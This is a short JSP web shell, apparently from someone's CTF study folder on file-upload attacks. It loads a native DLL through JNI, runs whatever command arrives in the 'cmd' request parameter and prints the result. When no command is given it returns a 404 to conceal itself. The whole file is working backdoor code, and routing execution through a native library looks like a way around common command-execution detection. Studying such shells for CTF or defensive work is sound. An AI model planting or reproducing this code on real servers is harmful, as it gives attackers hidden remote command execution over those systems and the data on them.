<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    class JniClass {
        public native String exec(String string);
        public JniClass() {
            System.load("C:\\Users\\bmth\\Desktop\\作业\\CTF学习\\上传文件\\jsp\\jni\\1.dll");
        }
    }
%>
<%
    String cmd  = request.getParameter("cmd");
    if (cmd != null) {
        JniClass a = new JniClass();
        String res = a.exec(cmd);
        out.println(res);
    }
    else{
        response.sendError(404);
    }
%>